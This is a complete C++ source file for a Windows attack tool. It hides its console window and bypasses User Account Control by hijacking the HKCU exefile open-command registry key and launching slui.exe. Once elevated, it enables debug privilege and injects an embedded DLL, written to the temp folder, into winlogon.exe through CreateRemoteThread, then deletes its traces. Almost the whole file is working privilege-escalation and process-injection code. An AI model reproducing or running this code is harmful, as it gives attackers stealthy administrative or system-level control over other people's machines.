#include <iostream>
#include <string>
#include <Windows.h>
#include <fstream>
#include <TlHelp32.h>
#include <stdio.h>
#include <chrono>
#include <thread>

#include "data.h"

using namespace std;

#pragma warning(disable : 4996)

wchar_t processPath[MAX_PATH];

void WriteFile(const char* fName) {
	ofstream fout;
	fout.open(fName, ios::binary | ios::out);
	fout.write((char*)&rawData, sizeof(rawData));
	fout.close();
}

BOOL SetPrivilege(
	HANDLE hToken,
	LPCTSTR lpszPrivilege,
	BOOL bEnablePrivilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,
		lpszPrivilege,
		&luid))
	{
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		return FALSE;
	}

	return TRUE;
}

void CreateRegistryKey(HKEY key, wstring path, wstring name)
{
	HKEY hKey;
	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		HKEY hKeyResult;
		RegCreateKeyW(hKey, name.c_str(), &hKeyResult);
		RegCloseKey(hKey);
	}
}

void DeleteRegistryKey(HKEY key, wstring path, wstring name)
{
	HKEY hKey;
	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		RegDeleteKeyW(hKey, name.c_str());
		RegCloseKey(hKey);
	}
}

void SetRegistryValue(HKEY key, wstring path, wstring name, wstring value)
{
	HKEY hKey;
	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		RegSetValueExW(hKey, name.c_str(), 0, REG_SZ, (BYTE*)value.c_str(), ((DWORD)wcslen(value.c_str()) + 1) * sizeof(wchar_t));
		RegCloseKey(hKey);
	}
}

BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

void ByPassUAC() {
	CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes", L"exefile");
	CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile", L"shell");
	CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell", L"open");
	CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open", L"command");

	SetRegistryValue(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open\\command", L"", processPath);

	ShellExecuteW(NULL, L"runas", L"C:\\Windows\\System32\\slui.exe", NULL, NULL, SW_SHOWNORMAL);

	Sleep(1000);

	DeleteRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open", L"command");
	DeleteRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell", L"open");
}

DWORD FindProcessId(string processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	Process32First(processSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	CloseHandle(processSnapshot);
	return 0;
}

BOOL InjectDLL(DWORD procID, const char* dllPath)
{
	BOOL WPM = 0;
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
	if (hProc == INVALID_HANDLE_VALUE)
	{
		return -1;
	}

	void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	WPM = WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);
	if (!WPM)
	{
		CloseHandle(hProc);
		return -2;
	}

	HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);
	if (!hThread)
	{
		VirtualFree(loc, strlen(dllPath) + 1, MEM_RELEASE);
		CloseHandle(hProc);
		return -3;
	}

	CloseHandle(hProc);
	VirtualFree(loc, strlen(dllPath) + 1, MEM_RELEASE);
	CloseHandle(hThread);

	return 0;
}

void InjectWinlogon() {
	string path = string(getenv("TEMP")) + "\\uac.dll";
	WriteFile(path.c_str());

	DWORD ProcessId = FindProcessId("winlogon.exe");
	InjectDLL(ProcessId, path.c_str());

	std::this_thread::sleep_for(std::chrono::milliseconds(1000));
	DeleteFile(path.c_str());
}

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	GetModuleFileNameW(NULL, processPath, sizeof(processPath));

    if (IsElevated()) {
		BOOL isOK;
		HANDLE hToken;
		HANDLE hCurrentProcess;
		hCurrentProcess = GetCurrentProcess();
		isOK = OpenProcessToken(hCurrentProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
		SetPrivilege(hToken, SE_DEBUG_NAME, TRUE);

		InjectWinlogon();
    } else { ByPassUAC(); }
}
